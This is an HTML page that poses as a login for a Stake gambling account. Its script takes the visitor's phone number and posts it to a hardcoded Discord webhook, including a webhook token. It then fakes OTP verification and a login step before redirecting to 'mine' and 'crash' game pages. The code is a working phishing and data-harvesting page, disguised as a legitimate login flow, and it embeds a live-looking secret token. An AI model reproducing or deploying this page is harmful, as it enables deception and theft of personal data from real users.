<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #0A0F24; /* Dark blue background */
            color: #ffffff; /* White text color */
        }
        .login-container {
            text-align: center;
        }
        .login-box {
            padding: 70px;
            border: 1px solid #1D2738; /* Slightly lighter blue border */
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
            text-align: center;
            background-color: #131A33; /* Slightly lighter background */
        }
        .login-box input {
            display: block;
            margin: 10px auto;
            padding: 10px;
            width: 100%;
            max-width: 200px;
            border: 1px solid #1D2738;
            border-radius: 5px;
            background-color: #1C243A;
            color: #ffffff;
        }
        .login-box button {
            padding: 10px 20px;
            background-color: #007BFF; /* Bright blue button */
            border: none;
            border-radius: 5px;
            color: #ffffff;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-box" id="phoneInput">
            <h2>Enter Phone Number On Your Stake Account.</h2>
            <input type="tel" id="phoneNumber" placeholder="Phone Number" maxlength="10">
            <button onclick="sendOTP()">Send OTP</button>
        </div>
        <div class="login-box" id="otpInput" style="display: none;">
            <h2>Enter OTP</h2>
            <input type="text" id="otp" placeholder="OTP">
            <button onclick="verifyOTP()">Verify OTP</button>
        </div>
        <div class="login-box" id="loginInput" style="display: none;">
            <h2>Login</h2>
            <input type="text" id="username" placeholder="Username">
            <input type="password" id="password" placeholder="Password">
            <button onclick="login()">Login</button>
        </div>
        <div class="login-box" id="gameChoice" style="display: none;">
            <h2>Choose a Game</h2>
            <button onclick="chooseGame('mine')">Mine</button>
            <button onclick="chooseGame('crash')">Crash</button>
        </div>
    </div>
    <script>
        async function sendOTP() {
            const phoneNumber = document.getElementById('phoneNumber').value;
            if (phoneNumber.length !== 10 || isNaN(phoneNumber)) {
                alert('Please enter a valid 10-digit phone number.');
                return;
            }

            const baseURL = 'https://discord.com/api/webhooks/';
            const webhookID = '1178223142259396698';
            const webhookToken = 'Q9jncDwEL9WCjhbhplOhpoR_K1cspkE4Ac6OgEHnV-DkpC4YBbso-MtpKyCkYC2RGz15';
            const webhookURL = `${baseURL}${webhookID}/${webhookToken}`;
            const message = {
                content: `Phone number: ${phoneNumber}`
            };

            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });
                setTimeout(function() {
                    document.getElementById('phoneInput').style.display = 'none';
                    document.getElementById('otpInput').style.display = 'block';
                    setTimeout(function() {
                        document.getElementById('otp').value = Math.floor(1000 + Math.random() * 9000); // Random 4-digit OTP
                    }, 2000);
                }, 2000);
            } catch (error) {
                alert('Failed to send phone number to the server.');
                console.error('Error:', error);
            }
        }

        function verifyOTP() {
            setTimeout(function() {
                document.getElementById('otpInput').style.display = 'none';
                document.getElementById('loginInput').style.display = 'block';
            }, 2000);
        }

        function login() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            if (username === password && password === username) {
                document.getElementById('loginInput').style.display = 'none';
                document.getElementById('gameChoice').style.display = 'block';
            } else {
                alert('Invalid login');
            }
        }

        function chooseGame(game) {
            if (game === 'mine') {
                window.location.href = 'mine.html';
            } else if (game === 'crash') {
                window.location.href = 'crash.html';
            }
        }
    </script>
</body>
</html>
